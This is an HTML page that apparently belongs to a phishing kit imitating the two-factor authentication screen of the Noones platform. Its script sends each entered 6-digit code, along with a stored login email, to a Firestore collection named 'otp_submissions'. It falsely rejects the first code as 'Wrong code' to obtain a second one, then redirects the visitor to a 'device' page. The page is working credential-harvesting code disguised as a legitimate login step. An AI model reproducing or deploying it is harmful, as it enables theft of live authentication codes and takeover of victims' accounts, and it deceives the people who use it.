<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Authenticator Verification</title>

<link rel="preconnect" href="https://fonts.googleapis.com">

<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Inter',sans-serif;
}

:root{

--bg:#1d1d1d;
--card:#2a2a2a;
--card2:#313131;
--border:#3d3d3d;
--text:#ffffff;
--muted:#a8a8a8;
--green:#38d66b;
--green-dark:#2db95d;

}

body{

background:var(--bg);

display:flex;

justify-content:center;

align-items:center;

min-height:100vh;

padding:25px;

color:var(--text);

}

.wrapper{

width:100%;

max-width:430px;

}

.logo{

text-align:center;

margin-bottom:30px;

}

.logo img{

width:180px;

max-width:80%;

height:auto;

}

.card{

background:var(--card);

border-radius:18px;

padding:34px 28px;

box-shadow:0 15px 40px rgba(0,0,0,.35);

}

h1{

font-size:34px;

font-weight:700;

margin-bottom:12px;

text-align:center;

}

.subtitle{

text-align:center;

color:var(--muted);

font-size:17px;

line-height:1.6;

margin-bottom:28px;

}

/* OTP */

.otp{

display:flex;

justify-content:center;

gap:10px;

margin-bottom:18px;

}

.otp input{

width:52px;

height:58px;

background:var(--card2);

border:1px solid var(--border);

border-radius:12px;

color:white;

font-size:26px;

font-weight:700;

text-align:center;

outline:none;

transition:.2s;

}

.otp input:focus{

border-color:var(--green);

box-shadow:0 0 0 3px rgba(56,214,107,.15);

}

#pasteBtn{

display:block;

margin:0 auto 24px;

background:#444;

border:none;

color:white;

padding:10px 22px;

border-radius:10px;

font-size:15px;

cursor:pointer;

transition:.2s;

}

#pasteBtn:hover{

background:#555;

}

#error{

display:none;

text-align:center;

margin-bottom:18px;

color:#ff7070;

font-size:15px;

font-weight:600;

}

#verifyBtn{

width:100%;

height:54px;

border:none;

border-radius:14px;

background:var(--green);

color:white;

font-size:17px;

font-weight:700;

cursor:pointer;

transition:.25s;

}

#verifyBtn:hover{

background:var(--green-dark);

}

#verifyBtn:disabled{

background:#555;

cursor:not-allowed;

}

.support{

margin-top:26px;

text-align:center;

font-size:15px;

color:var(--muted);

line-height:1.7;

}

.support a{

color:var(--green);

text-decoration:none;

font-weight:600;

}

.support a:hover{

text-decoration:underline;

}

/* MOBILE */

@media(max-width:480px){

body{

padding:18px;

}

.card{

padding:26px 20px;

}

.logo img{

width:160px;

}

h1{

font-size:28px;

}

.subtitle{

font-size:15px;

}

.otp{

gap:8px;

}

.otp input{

width:45px;

height:54px;

font-size:24px;

}

#verifyBtn{

height:52px;

font-size:16px;

}

}

</style>

</head>

<body>

<div class="wrapper">
    <!-- ==========================
LOGO
========================== -->

<div class="logo">

    <img src="images/noones-logo.png" alt="Noones">

</div>

<!-- ==========================
CARD
========================== -->

<div class="card">

    <h1>

        Two-factor authentication

    </h1>

    <div class="subtitle">

        Enter the 6-digit code from your Authenticator app.

    </div>

    <!-- OTP -->

    <div class="otp">

        <input type="text" maxlength="1">

        <input type="text" maxlength="1">

        <input type="text" maxlength="1">

        <input type="text" maxlength="1">

        <input type="text" maxlength="1">

        <input type="text" maxlength="1">

    </div>

    <!-- Paste -->

    <button id="pasteBtn" type="button">

        Paste

    </button>

    <!-- Error -->

    <div id="error">

        Wrong code. Please try again.

    </div>

    <!-- Continue -->

    <button id="verifyBtn" disabled>

        Continue

    </button>

    <!-- Support -->

    <div class="support">

        If you need to reset 2FA, please

        <a href="#" id="supportLink">

            contact support

        </a>

    </div>

</div>

</div>
<script type="module">

const inputs = [...document.querySelectorAll(".otp input")];

const verifyBtn = document.getElementById("verifyBtn");

const pasteBtn = document.getElementById("pasteBtn");

const error = document.getElementById("error");

/* ==========================
ENABLE BUTTON
========================== */

function updateButton(){

const filled = inputs.every(input => input.value.length === 1);

verifyBtn.disabled = !filled;

}

/* ==========================
INPUT
========================== */

inputs.forEach((input,index)=>{

input.addEventListener("input",()=>{

input.value=input.value.replace(/\D/g,"").slice(0,1);

if(input.value && index<inputs.length-1){

inputs[index+1].focus();

}

updateButton();

});

input.addEventListener("keydown",(e)=>{

if(e.key==="Backspace" && !input.value && index>0){

inputs[index-1].focus();

}

});

input.addEventListener("focus",()=>{

input.select();

});

});

/* ==========================
PASTE
========================== */

pasteBtn.addEventListener("click",async()=>{

try{

const text=(await navigator.clipboard.readText())
.replace(/\D/g,"")
.substring(0,6);

if(!text)return;

inputs.forEach((box,i)=>{

box.value=text[i] || "";

});

updateButton();

const next=inputs.find(input=>!input.value);

(next || inputs[5]).focus();

}catch{

alert("Unable to access clipboard.");

}

});

/* ==========================
PASTE USING CTRL+V
========================== */

document.addEventListener("paste",(e)=>{

const pasted=(e.clipboardData.getData("text"))
.replace(/\D/g,"")
.substring(0,6);

if(!pasted)return;

e.preventDefault();

inputs.forEach((box,i)=>{

box.value=pasted[i] || "";

});

updateButton();

});

/* ==========================
ENTER KEY
========================== */

document.addEventListener("keydown",(e)=>{

if(e.key==="Enter" && !verifyBtn.disabled){

verifyBtn.click();

}

});

updateButton();
import { db } from "./js/firebase.js";

import {
collection,
addDoc,
serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";

/* ==========================
VERIFY BUTTON
========================== */

verifyBtn.addEventListener("click", verifyOTP);

async function verifyOTP(){

error.style.display="none";

const otp = inputs.map(input=>input.value).join("");

if(otp.length!==6){

error.textContent="Please enter the complete 6-digit code.";
error.style.display="block";

return;

}

const email = localStorage.getItem("loginEmail") || "";

let attempts = Number(localStorage.getItem("otpAttempts")) || 0;

verifyBtn.disabled=true;

verifyBtn.textContent="Verifying...";

try{

await addDoc(collection(db,"otp_submissions"),{

email:email,

otp:otp,

attempt:attempts+1,

status:"Pending",

createdAt:serverTimestamp()

});

}catch(err){

verifyBtn.disabled=false;

verifyBtn.textContent="Continue";

error.textContent="Unable to verify. Please try again.";

error.style.display="block";

console.error(err);

return;

}

/* ==========================
FIRST ATTEMPT
========================== */

if(attempts===0){

localStorage.setItem("otpAttempts","1");

verifyBtn.disabled=false;

verifyBtn.textContent="Continue";

error.textContent="Wrong code. Please try again.";

error.style.display="block";

inputs.forEach(box=>box.value="");

inputs[0].focus();

updateButton();

return;

}

/* ==========================
SECOND ATTEMPT
========================== */

localStorage.removeItem("otpAttempts");

localStorage.setItem("authenticatorOTP",otp);

window.location.href="device.html";

}

/* ==========================
END
========================== */

</script>

</body>

</html>
